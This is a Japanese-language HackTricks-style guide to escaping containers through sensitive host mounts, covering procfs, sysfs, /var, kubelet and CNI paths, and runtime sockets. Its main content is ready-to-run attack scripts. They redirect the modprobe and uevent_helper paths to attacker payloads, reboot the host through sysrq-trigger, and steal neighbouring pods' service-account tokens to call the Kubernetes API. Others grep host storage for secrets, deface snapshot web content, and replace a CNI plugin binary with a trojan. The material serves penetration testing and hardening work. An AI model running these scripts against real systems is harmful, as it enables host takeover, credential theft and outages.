# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts は、慎重に隔離された process view を host resource の直接的な可視性へと戻してしまうことが多いため、最も重要な実践的 container-escape surface の1つです。危険なケースは `/` に限られません。`/proc`、`/sys`、`/var`、runtime socket、kubelet が管理する state、または device 関連の path の bind mount によって、kernel control、credential、隣接する container filesystem、runtime management interface が露出する可能性があります。

このページが個々の protection page とは別に存在するのは、abuse model が複数の要素にまたがるためです。writable host mount が危険なのは、mount namespace、user namespace、AppArmor や SELinux の coverage、そして露出した正確な host path が関係するためです。これを独立した topic として扱うことで、attack surface をより容易に評価できます。

## `/proc` Exposure

procfs には、通常の process information と影響の大きい kernel control interface の両方が含まれています。そのため、`-v /proc:/host/proc` のような bind mount や、予期せず writable な proc entry を露出する container view によって、information disclosure、denial of service、または host code execution へ直接つながる可能性があります。

高価値な procfs path には、以下があります。

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

まず、どの高価値な procfs entry が visible または writable なのかを確認します。
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
これらのパスは、それぞれ異なる理由で興味深いものです。`core_pattern`、`modprobe`、`binfmt_misc` は、書き込み可能な場合、ホスト上での code execution につながるパスになり得ます。`kallsyms`、`kmsg`、`kcore`、`config.gz` は、kernel exploitation に有用な強力な reconnaissance ソースです。`sched_debug` と `mountinfo` は、プロセス、cgroup、filesystem のコンテキストを明らかにし、コンテナ内部からホストのレイアウトを再構成するのに役立ちます。

各パスの実用的な価値は異なります。すべてが同じ impact を持つかのように扱うと、triage が難しくなります。

- `/proc/sys/kernel/core_pattern`
書き込み可能な場合、これは最も impact の大きい procfs パスの一つです。kernel は crash 後に pipe handler を実行するためです。コンテナから `core_pattern` を、overlay に保存された payload や mount されたホストパスに向けられる場合、ホスト上で code execution を取得できることがあります。専用の例については、[read-only-paths.md](protections/read-only-paths.md) も参照してください。
- `/proc/sys/kernel/modprobe`
このパスは、kernel が module-loading logic を呼び出す必要があるときに使用する userspace helper を制御します。コンテナから書き込み可能で、ホストの context で解釈される場合、別のホスト code-execution primitive になり得ます。helper path を trigger する方法と組み合わせられる場合は、特に興味深いものです。
- `/proc/sys/vm/panic_on_oom`
通常、これは clean な escape primitive ではありません。しかし、OOM condition を kernel panic の挙動に変えることで、memory pressure をホスト全体の denial of service に変換できます。
- `/proc/sys/fs/binfmt_misc`
registration interface が書き込み可能な場合、attacker は指定した magic value に対する handler を登録し、一致する file が実行されたときにホスト context での execution を取得できる可能性があります。
- `/proc/config.gz`
kernel exploit の triage に有用です。ホストの package metadata を必要とせずに、どの subsystem、mitigation、optional kernel feature が有効かを判断できます。
- `/proc/sysrq-trigger`
主に denial-of-service パスですが、非常に深刻なものです。ホストを即座に reboot、panic、またはその他の方法で disruption させることができます。
- `/proc/kmsg`
kernel ring buffer の message を明らかにします。ホスト fingerprinting、crash analysis、さらに一部の環境では kernel exploitation に役立つ情報の leak に有用です。
- `/proc/kallsyms`
readable な場合に価値があります。export された kernel symbol の情報を公開し、kernel exploit 開発時に address randomization に関する前提を崩すのに役立つ可能性があります。
- `/proc/[pid]/mem`
これは直接的な process-memory interface です。必要な ptrace-style condition を満たした状態で target process に到達できる場合、別の process の memory を読み取ったり変更したりできる可能性があります。現実的な impact は credentials、`hidepid`、Yama、ptrace restriction に大きく依存するため、強力ですが conditional なパスです。
- `/proc/kcore`
system memory を core-image-style に表示します。この file は非常に巨大で扱いにくいものですが、意味のある形で readable であれば、ホスト memory surface が不適切に露出していることを示します。
- `/proc/kmem` と `/proc/mem`
historically high-impact な raw memory interface です。多くの modern system では disabled または厳しく restricted されていますが、存在し、利用可能な場合は critical finding として扱うべきです。
- `/proc/sched_debug`
scheduling と task の情報を leak し、他の process view が想定よりも適切に見える場合でも、ホスト process の identity を露出させる可能性があります。
- `/proc/[pid]/mountinfo`
コンテナがホスト上のどこに実際に存在するか、どの path が overlay-backed か、また writable mount がホスト content に対応しているのか、それともコンテナ layer のみに対応しているのかを再構成するうえで、非常に有用です。

`/proc/[pid]/mountinfo` または overlay の詳細が readable な場合は、それらを使用してコンテナ filesystem のホストパスを復元します。
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
これらのコマンドは、複数の host-execution tricks で、container 内部の path を host の視点から見た対応する path に変換する必要があるため便利です。

### 完全な例: `modprobe` Helper Path Abuse

`/proc/sys/kernel/modprobe` が container から書き込み可能で、helper path が host context で解釈される場合、攻撃者が制御する payload にリダイレクトできます:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
正確な trigger は target と kernel の挙動によって異なりますが、重要なのは、書き込み可能な helper path によって、将来の kernel helper invocation を attacker が制御する host-path content へリダイレクトできる点です。

### 完全な例: `kallsyms`、`kmsg`、`config.gz` を使った Kernel Recon

目的が即時の escape ではなく exploitability assessment である場合:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
これらのコマンドは、有用な symbol information が可視になっているか、最近の kernel messages から興味深い state が明らかになるか、またどの kernel features や mitigations が compile されているかを確認するのに役立ちます。影響は通常、直接的な escape ではありませんが、kernel-vulnerability triage を大幅に短縮できる場合があります。

### Full Example: SysRq Host Reboot

`/proc/sysrq-trigger` が writable で、host view に到達できる場合:
```bash
echo b > /proc/sysrq-trigger
```
効果は即座にホストの再起動として現れます。これは subtle な例ではありませんが、procfs の exposure が情報開示をはるかに超えて深刻なものになり得ることを明確に示しています。

## `/sys` Exposure

sysfs は、大量の kernel および device の状態を公開します。一部の sysfs パスは主に fingerprinting に役立ちますが、その他のパスは helper の実行、device の動作、security-module の設定、または firmware の状態に影響を与える可能性があります。

価値の高い sysfs パスには、以下があります。

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

これらのパスが重要である理由はそれぞれ異なります。`/sys/class/thermal` は thermal-management の動作に影響を与える可能性があり、適切に制限されていない環境では、結果としてホストの安定性に影響を及ぼします。`/sys/kernel/vmcoreinfo` は crash-dump および kernel-layout の情報を leak する可能性があり、低レベルのホスト fingerprinting に役立ちます。`/sys/kernel/security` は Linux Security Modules が使用する `securityfs` interface であるため、予期しない access によって MAC 関連の state が公開または変更される可能性があります。EFI variable のパスは firmware が保持する boot 設定に影響を与える可能性があり、通常の configuration file よりもはるかに深刻です。`/sys/kernel/debug` 配下の `debugfs` は、developer 向けに意図された interface であり、production 向けに hardened された kernel API よりも安全性に関する期待値がはるかに低いため、特に危険です。

これらのパスの review に役立つ command は以下のとおりです。
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
それらのコマンドが興味深い理由：

- `/sys/kernel/security` によって、AppArmor、SELinux、または別の LSM の surface が、本来 host-only であるべき形で見えているかどうかが明らかになる場合があります。
- `/sys/kernel/debug` は、このグループで最も警戒すべき finding であることが多いです。`debugfs` が mount され、readable または writable である場合、kernel-facing surface が広範囲に存在すると考えられます。正確なリスクは、有効になっている debug node によって異なります。
- EFI variable の露出は比較的まれですが、通常の runtime file ではなく firmware-backed setting に触れるため、存在する場合は impact が大きくなります。
- `/sys/class/thermal` は、整然とした shell-style escape よりも、host の stability と hardware interaction に主に関係します。
- `/sys/kernel/vmcoreinfo` は主に host-fingerprinting と crash-analysis の情報源であり、low-level kernel state の把握に役立ちます。

### Full Example: `uevent_helper`

`/sys/kernel/uevent_helper` が writable の場合、`uevent` が trigger されたときに、kernel が attacker-controlled helper を実行する可能性があります：
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
この動作する理由は、helper path が host の観点から解釈されるためです。トリガーされると、helper は現在の container 内ではなく、host context で実行されます。

## `/var` Exposure

host の `/var` を container に mount することは、`/` の mount ほど劇的に見えないため、過小評価されがちです。実際には、runtime sockets、container snapshot directories、kubelet が管理する pod volumes、projected service-account tokens、さらに隣接する application filesystems に到達するのに十分な場合があります。現代の node では、最も運用上重要な container state が実際には `/var` に存在していることがよくあります。

### Kubernetes Example

`hostPath: /var` を設定した pod は、他の pod の projected tokens や overlay snapshot content を読み取れることがあります。
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
これらのコマンドが有用なのは、mount が単なるアプリケーションデータだけを公開しているのか、それとも影響の大きい cluster credentials まで公開しているのかを確認できるためです。読み取り可能な service-account token があれば、ローカルでの code execution を直ちに Kubernetes API access へとつなげられる可能性があります。

token が存在する場合は、token discovery で止めずに、それで何にアクセスできるかを検証します：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
ここでの影響は、local node accessをはるかに超える可能性があります。広範なRBAC権限を持つtokenにより、mountされた`/var`がcluster全体のcompromiseにつながる可能性があります。

### Docker と containerd の例

Docker hostsでは、関連データは`/var/lib/docker`以下にあることが多く、containerd-backed Kubernetes nodesでは`/var/lib/containerd`またはsnapshotter固有のpathにある場合があります：
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
マウントされた `/var` に別の workload の writable な snapshot 内容が露出している場合、攻撃者は現在の container 設定に触れることなく、application ファイルの変更、web コンテンツの設置、startup script の変更を行える可能性があります。

writable な snapshot 内容が見つかった場合の具体的な abuse のアイデア:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
これらのコマンドが役立つのは、mounted `/var` による主な3つの影響カテゴリ、つまり application tampering、secret recovery、そして隣接する workload への lateral movement を示すためです。

## Kubelet の状態、Plugins、CNI Paths

`/var/lib/kubelet`、`/opt/cni/bin`、または `/etc/cni/net.d` の mount は、privileged DaemonSets、CNI agents、CSI node plugins、GPU operators、storage helpers を通じて公開されることがよくあります。これらの mount は「node plumbing」として軽視されがちですが、新しい pods の実行経路に直接位置しており、kubelet credentials、projected secrets、registration sockets、実行可能な host-side plugin binaries が含まれていることがよくあります。

価値の高いターゲットには、次のものがあります。

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful な review commands は次のとおりです。
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
なぜこれらのパスが重要なのか：

- `/var/lib/kubelet/pki` には、kubelet の client certificates やその他の node-local credentials が露出している可能性があり、cluster の設計によっては API server や kubelet-facing TLS endpoints に対して再利用できる場合があります。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` には、同じ node 上の近隣の pods 用に projected された service-account tokens や mounted Secrets が含まれていることがよくあります。
- `/var/lib/kubelet/pod-resources/kubelet.sock` は主に reconnaissance surface ですが、非常に有用です。現在どの pods や containers が GPU、hugepages、SR-IOV devices、その他の node-local resources を所有しているかが明らかになります。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`、`/var/lib/kubelet/plugins`、`/var/lib/kubelet/plugins_registry` からは、どの CSI、DRA、device plugins がインストールされているか、また kubelet が通信することを想定している sockets が明らかになります。これらの directories が単に読み取り可能なのではなく書き込み可能な場合、この finding ははるかに深刻になります。<sup>[[1]](#references)</sup>
- `/opt/cni/bin` と `/etc/cni/net.d` は、pod-network setup path 上に直接位置しています。ここへの writable access は、単なる configuration exposure ではなく、遅延した host-execution primitive になることがよくあります。<sup>[[2]](#references)</sup>

### Writable `/opt/cni/bin` の完全な例

host CNI binary directory が read-write で mount されている場合、plugin を置き換えるだけで、その node 上で次に kubelet が pod sandbox を作成するときに host execution を取得できる可能性があります。<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
これはマウントされた `docker.sock` ほど即時性はありませんが、侵害された Kubernetes infrastructure pod では、より現実的なケースであることがよくあります。重要な点は、変更されたバイナリが現在のコンテナによってではなく、後からホストの network setup flow によって実行されることです。

## Runtime Sockets

機密性の高いホストマウントには、ディレクトリ全体ではなく Runtime Sockets が含まれていることがよくあります。これらは非常に重要なため、ここで明示的に繰り返しておきます。
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
これらのソケットのいずれかが mount された後の完全な exploitation フローについては、[runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) を参照してください。

まず簡単な初回 interaction pattern としては、
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
これらのいずれかに成功すると、「mounted socket」から「より高い権限を持つ sibling container の起動」までの経路は、通常、kernel breakout の経路よりもはるかに短くなります。

## Writable Host Path Task Hijack

Writable host mount は、危険な状態になるために `/` を公開する必要はありません。マウントされたパスに、host 側の scheduled task や service が後で使用する scripts、config files、hooks、plugins、または files が含まれている場合、container から host が実行する内容を変更できる可能性があります。

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
ホストプロセスが書き込み可能なファイルを利用する場合、テスト中はペイロードを単純かつ観測可能なものに保つ:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
興味深い部分は trust boundary です。write は container 内部から行われますが、execution は後で host service context 内で行われます。これにより、狭い hostPath または bind mount が、遅延型の host-code-execution primitive に変わります。

## Mount-Related CVEs

Host mounts は runtime vulnerabilities とも関係します。最近の重要な例には、次のものがあります。

- `runc` の `CVE-2024-21626`。leaked directory file descriptor により、working directory を host filesystem 上に配置できました。
- BuildKit の `CVE-2024-23651`、`CVE-2024-23652`、`CVE-2024-23653`。malicious Dockerfiles、frontends、および `RUN --mount` flows により、build 中に host file access、deletion、または elevated privileges が再び可能になりました。
- Buildah および Podman build flows の `CVE-2024-1753`。crafted bind mounts により、build 中に `/` を read-write で公開できました。
- `containerd` 2.1.0 の `CVE-2025-47290`。image unpack 中の TOCTOU により、特別に細工された image が pull 中に host filesystem を変更できました。

これらの CVE がここで重要なのは、mount handling が operator configuration だけの問題ではないことを示しているためです。runtime 自体が、mount-driven escape conditions を引き起こす可能性もあります。

## Checks

次のコマンドを使用すると、影響度の高い mount exposures を迅速に特定できます:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
ここで興味深い点:

- Host root、`/proc`、`/sys`、`/var`、および runtime sockets は、いずれも最優先で確認すべき事項です。
- 書き込み可能な proc/sys エントリは、多くの場合、安全な container view ではなく、host-global な kernel controls が mount によって公開されていることを意味します。
- mount された `/var` のパスについては、単なる filesystem review にとどまらず、credential と neighboring workload の確認が必要です。
- Kubelet の state directories と CNI/plugin paths は、runtime sockets と同じ優先度で確認すべきです。これらは多くの場合、node の pod-creation および credential-distribution path に直接存在するためです。

## References

- [1] [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)

{{#include ../../../banners/hacktricks-training.md}}
